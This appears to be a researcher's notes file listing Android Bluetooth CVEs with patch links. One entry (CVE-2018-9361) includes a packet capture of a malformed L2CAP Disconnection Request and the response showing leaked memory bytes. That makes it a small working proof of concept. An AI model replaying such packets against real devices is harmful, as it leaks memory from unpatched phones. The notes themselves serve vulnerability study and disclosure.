
## CVE-2018-????

### Vuln

### Diff
https://android.googlesource.com/platform/system/bt/+/f1c2c86080bcd7b3142ff821441696fc99c2bc9a%5E%21/#F0

### Request

### Response


## CVE-2018-9361

### Vuln
Destination CID and Source CID leak out bytes in L2CAP Disconnection Response

### Diff
https://android.googlesource.com/platform/system/bt/+/70d86c36a57aa860924c7475f59a947aa234e834%5E%21/#F0

### Request
Mar 28 19:49:19.752  L2CAP Send       0x0047  D4:61:2E:12:67:7A  Disconnection Request  SEND  
	Channel ID: 0x0001  Length: 0x0004 (04) [ 06 00 00 00 ]
	L2CAP Payload:
	00000000: 0600 0000                                ....
Mar 28 19:49:19.752  ACL Send         0x0047  D4:61:2E:12:67:7A  Data [Handle: 0x0047, Packet Boundary Flags: 0x0, Length: 0x0008 (8)]  SEND  
	Data [Handle: 0x0047, Packet Boundary Flags: 0x0, Length: 0x0008 (8)]
	Packet Boundary Flags: [00] 0x00 - Reserved for future use
	Broadcast Flags: [00] 0x00 - Point-to-point
	Data (0x0008 bytes)
Mar 28 19:49:19.752  ACL Send         0x0000                     00000000: 4700 0800 0400 0100 0600 0000            G...........  SEND  

### Response
Mar 28 19:49:19.766  L2CAP Receive    0x0047  D4:61:2E:12:67:7A  Disconnection Response  RECV  
	Identifier: 0x00
	Size: 4 (0x0004)
	Destination CID: 0x487E
	Source CID: 0x3A6C
	Channel ID: 0x0001  Length: 0x0008 (08) [ 07 00 04 00 7E 48 6C 3A ]
	L2CAP Payload:
	00000000: 0700 0400 7e48 6c3a                      ....~Hl:
Mar 28 19:49:19.766  ACL Receive      0x0047  D4:61:2E:12:67:7A  Data [Handle: 0x0047, Packet Boundary Flags: 0x2, Length: 0x000C (12)]  RECV  
	Data [Handle: 0x0047, Packet Boundary Flags: 0x2, Length: 0x000C (12)]
	Packet Boundary Flags: [10] 0x02 - First packet of Higher Layer Message (i.e. start of an L2CAP packet)
	Broadcast Flags: [00] 0x00 - Point-to-point
	Data (0x000c bytes)
Mar 28 19:49:19.766  ACL Receive      0x0000                     00000000: 4720 0c00 0800 0100 0700 0400 7e48 6c3a  G ..........~Hl:  RECV  

